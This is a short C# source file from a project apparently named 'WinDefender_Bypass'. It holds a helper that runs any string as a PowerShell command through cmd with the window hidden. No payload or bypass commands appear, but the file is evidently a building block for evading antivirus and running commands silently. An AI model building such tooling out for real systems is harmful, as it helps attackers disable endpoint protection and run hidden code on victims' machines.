using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WinDefender_Bypass
{
    public static class PowerShell
    {
        public static void SendCommand(string command)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = $"/c powershell -command \"{command}\"",
                CreateNoWindow = true,
                UseShellExecute = false,
            });
        }
    }
}
